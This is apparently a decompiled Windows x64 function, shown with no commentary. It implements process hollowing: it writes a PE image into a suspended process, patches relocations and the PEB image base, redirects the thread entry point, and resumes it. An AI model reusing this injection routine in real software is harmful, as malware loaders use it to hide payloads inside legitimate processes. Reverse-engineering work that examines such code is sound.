__int64 __fastcall sub_140001640(HANDLE *a1, int *a2)
{
  char *v3; // r13
  char *v5; // rax
  char *v6; // r15
  SIZE_T v7; // r9
  __int64 v8; // rbx
  __int64 v9; // rbx
  char *v10; // rbp
  int v11; // esi
  __int64 i; // rdi
  char *v13; // rdx
  __int64 v14; // r10
  unsigned int v15; // r8d
  char *v16; // r13
  __int64 v17; // r15
  unsigned int *v18; // r15
  unsigned __int64 v19; // rax
  unsigned int v20; // edx
  __int64 v21; // rsi
  __int64 v22; // rcx
  unsigned __int16 v23; // ax
  __int64 v24; // rdi
  HANDLE v25; // rcx
  char *v26; // rdi
  HANDLE v27; // rcx
  HANDLE v28; // rcx
  char *v30; // [rsp+38h] [rbp-530h]
  char *v31; // [rsp+40h] [rbp-528h]
  char *v32; // [rsp+48h] [rbp-520h]
  CONTEXT Context; // [rsp+50h] [rbp-518h] BYREF
  __int64 Buffer; // [rsp+520h] [rbp-48h] BYREF

  v3 = (char *)a2 + a2[15];
  v32 = v3;
  v5 = (char *)VirtualAllocEx(*a1, 0LL, *((unsigned int *)v3 + 20), 0x3000u, 0x40u);
  v30 = v5;
  v6 = v5;
  if ( v5 )
  {
    v7 = *((unsigned int *)v3 + 21);
    v31 = &v5[-*((_QWORD *)v3 + 6)];
    *((_QWORD *)v3 + 6) = v5;
    if ( WriteProcessMemory(*a1, v5, a2, v7, 0LL) )
    {
      v8 = a2[15];
      v9 = *(int *)((char *)a2 + v8 + 176) ? *(_QWORD *)((char *)a2 + v8 + 176) : 0LL;
      v10 = 0LL;
      v11 = 0;
      if ( *((_WORD *)v3 + 3) )
      {
        for ( i = 0LL; ; i += 40LL )
        {
          v13 = &v3[i + 24 + *((unsigned __int16 *)v3 + 10)];
          v14 = *((unsigned int *)v13 + 3);
          if ( (unsigned int)v9 >= (unsigned int)v14 && (unsigned int)v9 < (int)v14 + *((_DWORD *)v13 + 2) )
            v10 = &v3[i + 24 + *((unsigned __int16 *)v3 + 10)];
          if ( !WriteProcessMemory(
                  *a1,
                  &v6[v14],
                  (char *)a2 + *((unsigned int *)v13 + 5),
                  *((unsigned int *)v13 + 4),
                  0LL) )
            break;
          if ( ++v11 >= *((unsigned __int16 *)v3 + 3) )
          {
            if ( v10 )
            {
              LODWORD(v9) = 0;
              if ( HIDWORD(v9) )
              {
                v15 = *((_DWORD *)v10 + 5);
                v16 = v6;
                do
                {
                  v17 = (unsigned int)v9;
                  LODWORD(v9) = v9 + 8;
                  v18 = (unsigned int *)((char *)a2 + v15 + v17);
                  v19 = ((unsigned __int64)v18[1] - 8) >> 1;
                  if ( (_DWORD)v19 )
                  {
                    v20 = v15;
                    v21 = (unsigned int)v19;
                    do
                    {
                      v22 = (unsigned int)v9;
                      LODWORD(v9) = v9 + 2;
                      v23 = *(_WORD *)((char *)a2 + v20 + v22);
                      if ( v23 >= 0x1000u )
                      {
                        v24 = *v18;
                        v25 = *a1;
                        Buffer = 0LL;
                        v26 = &v16[(v23 & 0xFFF) + v24];
                        ReadProcessMemory(v25, v26, &Buffer, 8uLL, 0LL);
                        Buffer += (__int64)v31;
                        WriteProcessMemory(*a1, v26, &Buffer, 8uLL, 0LL);
                        v15 = *((_DWORD *)v10 + 5);
                        v20 = v15;
                      }
                      --v21;
                    }
                    while ( v21 );
                  }
                }
                while ( (unsigned int)v9 < HIDWORD(v9) );
                v3 = v32;
                v6 = v30;
              }
              memset(&Context, 0, sizeof(Context));
              v27 = a1[1];
              Context.ContextFlags = 1048587;
              if ( GetThreadContext(v27, &Context) )
              {
                if ( WriteProcessMemory(*a1, (LPVOID)(Context.Rdx + 16), v3 + 48, 8uLL, 0LL) )
                {
                  v28 = a1[1];
                  Context.Rcx = (DWORD64)&v6[*((unsigned int *)v3 + 10)];
                  if ( SetThreadContext(v28, &Context) )
                  {
                    ResumeThread(a1[1]);
                    return 1LL;
                  }
                }
              }
            }
            return 0LL;
          }
        }
      }
    }
  }
  return 0LL;
}